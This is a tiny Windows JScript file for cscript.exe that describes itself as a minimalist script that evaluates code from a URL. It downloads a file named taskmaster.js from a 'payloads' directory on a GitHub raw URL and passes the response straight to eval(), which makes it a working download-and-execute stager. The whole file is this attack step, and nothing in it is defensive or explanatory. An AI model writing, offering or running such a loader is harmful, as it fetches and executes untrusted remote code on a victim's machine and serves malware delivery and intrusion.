// cscript.exe minimalist eval script from URL.

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
strURL = 'https://raw.githubusercontent.com/secdev-01/NEUTRONSTAR/main/payloads/taskmaster.js';
var temp = WinHttpReq.Open("GET", strURL, false);  
WinHttpReq.Send();
strResult = WinHttpReq.ResponseText;
eval(strResult);
WScript.StdOut.WriteLine("Complete");
